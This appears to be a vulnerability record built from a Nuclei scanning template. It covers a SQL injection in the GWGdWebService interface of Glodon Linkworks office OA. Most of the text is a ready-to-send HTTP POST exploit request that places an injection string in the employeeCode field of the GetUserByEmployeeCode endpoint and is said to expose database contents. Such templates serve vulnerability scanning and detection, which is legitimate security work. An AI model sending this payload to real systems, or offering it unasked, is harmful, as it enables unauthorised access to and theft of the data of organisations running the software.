# Nuclei Template: Glodon Linkworks GWGdWebService - SQL injection
**Template ID:** glodon-linkworks-sqli
**Vulnerability Class:** SQL Injection
**Severity:** High
**Source:** Nuclei Template (`glodon-linkworks-sqli.yaml`)

## Vulnerability Information & PoC

## Description
There is a SQL injection vulnerability in the GWGdWebService interface of Glodon Linkworks office OA. Sensitive information in the database can be obtained after sending a request package.

## Steps to reproduce / Exploit Payload
```http
POST /Org/service/Service.asmx/GetUserByEmployeeCode HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

employeeCode=1'-1/user--'&EncryptData=1
```

## References
- https://github.com/zan8in/pocwiki/blob/main/%E5%B9%BF%E8%81%94%E8%BE%BE-linkworks-gwgdwebservice%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
